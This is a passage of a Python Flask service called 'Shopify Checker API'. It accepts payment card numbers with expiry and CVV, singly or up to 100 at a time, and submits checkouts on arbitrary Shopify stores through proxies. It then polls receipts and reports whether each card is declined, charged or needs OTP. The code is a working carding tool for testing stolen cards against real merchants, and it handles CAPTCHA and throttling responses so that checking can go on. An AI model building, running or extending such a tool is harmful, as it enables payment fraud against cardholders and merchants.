            if is_captcha(st_txt or ""): return False,"CAPTCHA_REQUIRED_submit",gateway,price,currency
            if st_txt and "Your order total has changed." in st_txt:
                return False,"site_not_supported_total_changed",gateway,price,currency
            if st_txt and "The requested payment method is not available." in st_txt:
                return False,"payment_method_unavailable",gateway,price,currency

            sj, se = safe_json(st_txt, "submit")
            rid = None

            if se:
                raw_low = (st_txt or "").lower()
                if "processedreceipt" in raw_low or "order_placed" in raw_low:
                    return True,"ORDER_PLACED",gateway,price,currency
                if "submittedforcompletion" in raw_low or "submitsuccess" in raw_low:
                    m_rid = re.search(r'"id"\s*:\s*"([^"]{10,})"', st_txt or "")
                    rid = m_rid.group(1) if m_rid else None
                    if not rid: return True,"ORDER_PLACED",gateway,price,currency
                elif "paymentfailed" in raw_low or "declined" in raw_low:
                    code = eb(st_txt or "","\"code\":\"","\"") or "PAYMENT_FAILED"
                    return True,code,gateway,price,currency
                elif "actionrequired" in raw_low:
                    return True,"OTP_REQUIRED",gateway,price,currency
                else:
                    return False,f"submit_parse_err:{se[:80]}",gateway,price,currency

            if sj and sj.get("errors"):
                for e in (sj.get("errors") or []):
                    code = (e.get("code") or e.get("message") or "")
                    if code: return False,clean_response(str(code)),gateway,price,currency
                return False,"submit_gql_error",gateway,price,currency

            # ✅ FIX 5: robust walker for nested data
            data_node = (sj or {}).get("data") or {}
            sd = None
            if isinstance(data_node, dict):
                sd = data_node.get("submitForCompletion")
                if not isinstance(sd, dict):
                    sess = data_node.get("session")
                    if isinstance(sess, dict):
                        sd = sess.get("submitForCompletion")
                if not isinstance(sd, dict):
                    for v in data_node.values():
                        if isinstance(v, dict) and v.get("__typename"):
                            sd = v; break
            if not isinstance(sd, dict): sd = {}

            rtyp = sd.get("__typename","")

            def _receipt_id(node):
                if not isinstance(node,dict): return None
                rec = node.get("receipt") or {}
                if not isinstance(rec,dict): return None
                if rec.get("__typename")=="ProcessedReceipt": return "PROCESSED"
                return rec.get("id")

            def _declined_msg(node):
                for e in (node.get("errors") or []):
                    if not isinstance(e,dict): continue
                    code = e.get("code","")
                    det  = (e.get("localizedMessage","") or e.get("nonLocalizedMessage","") or e.get("message",""))
                    if det and code in ("GENERIC_ERROR","PAYMENT_FAILED",""): return det
                    if code: return code
                return "submit_rejected"

            if rtyp in ("SubmitSuccess","SubmittedForCompletion","SubmitAlreadyAccepted"):
                r_id = _receipt_id(sd)
                if r_id=="PROCESSED": return True,"ORDER_PLACED",gateway,price,currency
                if r_id: rid = r_id
                else:    return True,"ORDER_PLACED",gateway,price,currency
            elif rtyp=="SubmitFailed":
                return False,clean_response(str(sd.get("reason","PAYMENT_FAILED"))),gateway,price,currency
            elif rtyp=="SubmitRejected":
                return False,_declined_msg(sd),gateway,price,currency
            elif rtyp=="Throttled":
                return False,"throttled_submit",gateway,price,currency
            elif rtyp=="CheckpointDenied":
                return False,"checkpoint_denied_submit",gateway,price,currency
            elif rtyp=="":
                raw_low = (st_txt or "").lower()
                if "processedreceipt"  in raw_low: return True,"ORDER_PLACED",gateway,price,currency
                if "paymentfailed"     in raw_low or "declined" in raw_low:
                    code = eb(st_txt,"\"code\":\"","\"") or "PAYMENT_FAILED"
                    return True,code,gateway,price,currency
                if "actionrequired"    in raw_low: return True,"OTP_REQUIRED",gateway,price,currency
                m_rid = re.search(r'"id"\s*:\s*"([^"]{10,})"', st_txt or "")
                if m_rid: rid = m_rid.group(1)
                else:     return False,f"empty_submit:{(st_txt or '')[:80]}",gateway,price,currency
            else:
                r_id = _receipt_id(sd)
                if r_id=="PROCESSED": return True,"ORDER_PLACED",gateway,price,currency
                rid = r_id
                if not rid: return False,f"unknown_submit_type:{rtyp}",gateway,price,currency

            if not rid:
                return False,"no_receipt_id_to_poll",gateway,price,currency

            # ── Poll ──────────────────────────────────────────────────────────
            await asyncio.sleep(POLL_INITIAL)

            poll_body = {"query":QUERY_POLL,"operationName":"PollForReceipt",
                         "variables":{"receiptId":rid,"sessionToken":sst}}
            poll_p    = {"operationName":"PollForReceipt"}
            final_t   = ""

            for _ in range(POLL_MAX):
                pt, _ = await _gql(session, gql_url, poll_p, hdrs, poll_body, proxy)
                if is_captcha(pt or ""): return True,"CARD_DECLINED",gateway,price,currency

                pj, pe = safe_json(pt, "poll")
                if pj:
                    rec = (pj.get("data") or {}).get("receipt") or {}
                    if isinstance(rec,dict) and rec:
                        tn = rec.get("__typename","")
                        if tn=="ProcessedReceipt":
                            return True,"ORDER_PLACED",gateway,price,currency
                        if tn=="FailedReceipt":
                            err = rec.get("processingError") or {}
                            if isinstance(err,dict):
                                etype = err.get("__typename","")
                                if etype=="PaymentFailed":
                                    code = err.get("code","")
                                    msg  = err.get("messageUntranslated","")
                                    result_msg = (msg if msg and code in ("GENERIC_ERROR","PAYMENT_FAILED","")
                                                  else code or "PAYMENT_FAILED")
                                    return True,result_msg,gateway,price,currency
                                code = err.get("code") or etype or "PAYMENT_FAILED"
                                return True,code,gateway,price,currency
                            return True,"PAYMENT_FAILED",gateway,price,currency
                        if tn=="ActionRequiredReceipt":
                            return True,"OTP_REQUIRED",gateway,price,currency
                        if tn in ("ProcessingReceipt","WaitingReceipt"):
                            pd_raw = rec.get("pollDelay")
                            if pd_raw:
                                pd_s = float(pd_raw)/1000.0 if float(pd_raw)>10 else float(pd_raw)
                                sleep_t = min(pd_s, 3.0)
                            else:
                                sleep_t = POLL_RETRY
                            await asyncio.sleep(max(sleep_t, 0.3))
                            final_t = pt or ""; continue
                else:
                    raw_low = (pt or "").lower()
                    if "processedreceipt" in raw_low:
                        return True,"ORDER_PLACED",gateway,price,currency
                    if "failedreceipt"    in raw_low:
                        code = eb(pt or "","\"code\":\"","\"") or "PAYMENT_FAILED"
                        return True,code,gateway,price,currency
                    if "actionrequiredreceipt" in raw_low:
                        return True,"OTP_REQUIRED",gateway,price,currency
                    if "waitingreceipt" in raw_low or "processingreceipt" in raw_low:
                        await asyncio.sleep(POLL_RETRY); final_t=pt or ""; continue
                final_t = pt or ""; break

            if "WaitingReceipt" in final_t:
                return False,"WaitingReceipt_timeout_change_proxy",gateway,price,currency

            fj, _ = safe_json(final_t,"poll_final")
            if fj:
                rec_fin = (fj.get("data") or {}).get("receipt") or {}
                if isinstance(rec_fin,dict):
                    tn_fin = rec_fin.get("__typename","")
                    if tn_fin=="ProcessedReceipt":     return True,"ORDER_PLACED",gateway,price,currency
                    if tn_fin=="FailedReceipt":
                        err = rec_fin.get("processingError") or {}
                        code = (err.get("code") if isinstance(err,dict) else None) or "PAYMENT_FAILED"
                        msg  = (err.get("messageUntranslated","") if isinstance(err,dict) else "")
                        return True,(msg or code),gateway,price,currency
                    if tn_fin=="ActionRequiredReceipt": return True,"OTP_REQUIRED",gateway,price,currency
                if "shopify_payments" in str(fj): return True,"ORDER_PLACED",gateway,price,currency

            raw_low = final_t.lower()
            if "processedreceipt"  in raw_low: return True,"ORDER_PLACED",gateway,price,currency
            if "actionrequiredreceipt" in raw_low: return True,"OTP_REQUIRED",gateway,price,currency
            if "failedreceipt" in raw_low or "paymentfailed" in raw_low:
                code = eb(final_t,"\"code\":\"","\"") or "CARD_DECLINED"
                return True,code,gateway,price,currency
            return False,"unknown_result_after_poll",gateway,price,currency

    except Exception as e:
        logger.error(traceback.format_exc())
        return False,f"exception:{str(e)[:120]}",gateway,price,currency


# ══════════════════════════════════════════════════════════════════════════════
#  SHARED EVENT LOOP
# ══════════════════════════════════════════════════════════════════════════════
_loop: asyncio.AbstractEventLoop | None = None
_loop_thread: threading.Thread | None   = None
_semaphore: asyncio.Semaphore | None    = None
_queue_depth = 0
_queue_lock  = threading.Lock()

def _start_loop():
    global _loop, _semaphore
    _loop = asyncio.new_event_loop()
    asyncio.set_event_loop(_loop)
    _semaphore = asyncio.Semaphore(MAX_PARALLEL)
    _loop.run_forever()

def _get_loop() -> asyncio.AbstractEventLoop:
    global _loop_thread
    if _loop is None or not _loop.is_running():
        _loop_thread = threading.Thread(target=_start_loop, daemon=True, name="shopify-loop")
        _loop_thread.start()
        for _ in range(50):
            if _loop and _loop.is_running():
                break
            time.sleep(0.05)
    return _loop

async def _bounded_process_card(cc, mes, ano, cvv, site, variant_id, proxy_str):
    async with _semaphore:
        return await process_card(cc, mes, ano, cvv, site, variant_id, proxy_str)

def run_card_sync(cc, mes, ano, cvv, site, variant_id, proxy_str, timeout=70):
    global _queue_depth
    loop = _get_loop()
    coro = _bounded_process_card(cc, mes, ano, cvv, site, variant_id, proxy_str)
    fut  = asyncio.run_coroutine_threadsafe(coro, loop)
    with _queue_lock: _queue_depth += 1
    try:
        return fut.result(timeout=timeout)
    finally:
        with _queue_lock: _queue_depth -= 1


# ══════════════════════════════════════════════════════════════════════════════
#  FLASK API
# ══════════════════════════════════════════════════════════════════════════════
app = Flask(__name__)

def _parse_cc(raw):
    parts = raw.strip().split("|")
    if len(parts)!=4: raise ValueError("Use CC|MM|YYYY|CVV")
    return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()

@app.route("/shopify", methods=["GET","POST"])
def shopify_checker():
    p = (request.get_json(silent=True) or
         (request.form.to_dict() if request.method=="POST" else request.args.to_dict()))

    site_raw  = (p.get("site") or "").strip()
    cc_raw    = (p.get("cc")   or "").strip()
    proxy_str = (p.get("proxy") or "").strip() or None
    variant   = (p.get("variant") or "").strip() or None

    if not site_raw: return jsonify({"error":"Missing 'site'","status":False}), 400
    if not cc_raw:   return jsonify({"error":"Missing 'cc' (CC|MM|YYYY|CVV)","status":False}), 400

    try:
        cc, mes, ano, cvv = _parse_cc(cc_raw)
    except ValueError as e:
        return jsonify({"error":str(e),"status":False}), 400

    site = site_raw.replace("https://","").replace("http://","").rstrip("/")
    t0   = time.time()

    try:
        success, message, gw, price, curr = run_card_sync(cc, mes, ano, cvv, site, variant, proxy_str)
    except TimeoutError:
        return jsonify({"error":"Card check timed out","status":False,"cc":cc_raw}), 504
    except Exception as e:
        return jsonify({"error":str(e)[:120],"status":False,"cc":cc_raw}), 500

    try:    price_f = float(price)
    except: price_f = 0.0

    return jsonify({
        "Gateway":  gw,
        "Price":    price_f,
        "Response": clean_response(message),
        "Status":   success,
        "cc":       cc_raw,
        "time":     round(time.time()-t0, 2),
    })


@app.route("/shopify_bulk", methods=["POST"])
def shopify_bulk():
    data  = request.get_json(silent=True) or {}
    cards = data.get("cards") or []
    site  = (data.get("site") or "").strip().replace("https://","").replace("http://","").rstrip("/")
    proxy = (data.get("proxy") or "").strip() or None

    if not cards or not site:
        return jsonify({"error":"Missing 'cards' list or 'site'"}), 400
    if len(cards)>100:
        return jsonify({"error":"Max 100 cards per bulk request"}), 400

    loop = _get_loop()

    async def _run_all():
        async def _one(raw):
            try:
                cc, mes, ano, cvv = _parse_cc(raw)
            except ValueError:
                return {"cc":raw,"error":"bad_format","Status":False}
            async with _semaphore:
                try:
                    success, message, gw, price, curr = await process_card(cc,mes,ano,cvv,site,None,proxy)
                    return {"cc":raw,"Gateway":gw,"Price":price,
                            "Response":clean_response(message),"Status":success}
                except Exception as e:
                    return {"cc":raw,"error":str(e)[:80],"Status":False}
        return await asyncio.gather(*[_one(r) for r in cards])

    fut = asyncio.run_coroutine_threadsafe(_run_all(), loop)
    try:
        results = list(fut.result(timeout=120))
    except TimeoutError:
        return jsonify({"error":"Bulk check timed out (120s)"}), 504
    except Exception as e:
        return jsonify({"error":str(e)[:120]}), 500

    return jsonify({
        "results": results,
        "total":   len(cards),
        "done":    sum(1 for r in results if r and "error" not in r),
    })


@app.route("/health", methods=["GET"])
def health():
    return jsonify({
        "ok":          True,
        "workers":     MAX_PARALLEL,
        "in_flight":   _queue_depth,
        "available":   max(0, MAX_PARALLEL - _queue_depth),
        "loop_alive":  _loop is not None and _loop.is_running(),
        "conn_cache":  len(_conn_cache),
        "time":        time.strftime("%Y-%m-%d %H:%M:%S"),
    })


@app.route("/", methods=["GET"])
def root():
    return jsonify({
        "name": "Shopify Checker API — 20-Parallel Build (FIXED)",
        "endpoints": {
            "check":  "GET/POST /shopify?cc=CC|MM|YYYY|CVV&site=example.com[&proxy=ip:port:user:pass]",
            "bulk":   "POST /shopify_bulk {cards:[...],site:...,proxy:...} — up to 100 cards",
            "health": "GET /health",
        },
        "parallel": MAX_PARALLEL,
        "deploy":   "gunicorn -w 1 -k gthread --threads 64 shopify_api:app",
    })


if __name__ == "__main__":
    _get_loop()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
